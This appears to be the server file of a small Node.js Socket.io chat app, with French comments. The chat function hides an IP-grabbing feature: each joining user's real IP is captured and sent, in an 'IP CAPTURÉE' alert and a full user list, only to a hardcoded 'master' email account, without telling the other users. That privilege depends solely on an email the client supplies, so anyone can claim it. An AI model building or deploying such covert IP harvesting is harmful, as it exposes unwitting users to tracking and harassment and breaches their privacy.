const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
app.set('trust proxy', true); // Indispensable pour Render

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let users = [];
const MASTER = "toucheur2pp@heaven.com";

io.on('connection', (socket) => {
    // Récupération de l'IP réelle
    let ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    if (ip && ip.includes(',')) ip = ip.split(',')[0];
    ip = ip ? ip.replace('::ffff:', '').trim() : "0.0.0.0";

    socket.on('init', (data) => {
        const u = { id: socket.id, n: data.n, e: data.e, ip: ip };
        users.push(u);

        // Alerte au Maître
        const boss = users.find(user => user.e === MASTER);
        if (boss && u.e !== MASTER) {
            io.to(boss.id).emit('sys_msg', `⚠️ IP CAPTURÉE : ${u.n} -> ${u.ip}`);
        }
        updateAll();
    });

    socket.on('chat', (data) => {
        const sender = users.find(u => u.id === socket.id);
        if (sender) io.emit('chat', { n: sender.n, t: data });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        updateAll();
    });

    function updateAll() {
        const boss = users.find(u => u.e === MASTER);
        if (boss) io.to(boss.id).emit('sync', users); // Le boss voit tout
        io.emit('sync', users.map(u => ({ id: u.id, n: u.n }))); // Les autres voient les noms
    }
});

server.listen(process.env.PORT || 3000, '0.0.0.0');
